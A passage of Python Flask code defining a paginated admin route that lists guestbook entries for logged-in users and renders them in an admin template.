        return render_template('admin/guestbook_list.html',gblist=gblist, func=func,pagecount=lcount,index=index,uinfo=g.current_user)


@admin.route('/guestbooklist',methods=['GET', 'POST'])
@admin.route('/guestbooklist/<int:index>', methods=['GET', 'POST'])
@auth.login_required
#@permission_required('user',Permission.VIEW)
def guestbook_list(index=1):
    if request.method == 'POST':
        return redirect(url_for('.guestbook_list'))
    else:
        pagesize = 8
        count = Guestbook.getcount()
        lcount = common.getpagecount(count,pagesize)
        if index>lcount:
            index = lcount
        if index<1:
            index=1
        gblist = Guestbook.getlist(index=index,count=pagesize)

        func = {'stamp2time': common.stamp2time,'can': common.can}
        return render_template('admin/guestbook_list.html',gblist=gblist, func=func,pagecount=lcount,index=index,uinfo=g.current_user)
